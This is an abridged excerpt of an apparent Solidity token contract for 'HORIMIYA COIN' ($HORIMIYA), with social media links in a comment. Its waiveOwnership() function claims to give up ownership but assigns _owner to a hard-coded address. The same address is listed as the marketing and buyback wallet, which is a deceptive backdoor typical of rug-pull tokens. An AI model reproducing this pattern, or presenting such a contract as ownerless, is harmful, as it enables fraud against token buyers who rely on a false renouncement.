...
/*
https:https://t.me/Horimiyabsc
https://twitter.com/Horimiyabsc
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = 0x0C0543819043e9aE67B20E17835D9F8e10E8d230;
    }
...
contract Horimiya is Context, IERC20, Ownable {
    ...
    string private _name = "HORIMIYA COIN";
    string private _symbol = "$HORIMIYA";
    uint8 private _decimals = 9;

    address payable public MarketingWallet = payable(0x0C0543819043e9aE67B20E17835D9F8e10E8d230); // Marketing Address SM
    address payable public BuyBackWallet = payable(0x0C0543819043e9aE67B20E17835D9F8e10E8d230); // Team Address
